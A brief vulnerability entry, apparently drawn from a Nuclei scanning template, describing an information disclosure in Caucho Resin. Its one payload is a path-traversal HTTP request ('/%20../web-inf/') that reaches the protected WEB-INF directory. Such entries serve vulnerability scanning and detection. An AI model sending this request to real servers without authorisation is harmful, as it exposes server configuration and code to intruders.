# Vulnerability: Caucho Resin Information Disclosure
**Classification:** RESIN
**Source:** Nuclei Template (`resin-cnnvd-200705-315.yaml`)

## Description
Sensitive info disclosed in Caucho Resin.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/%20../web-inf/
```

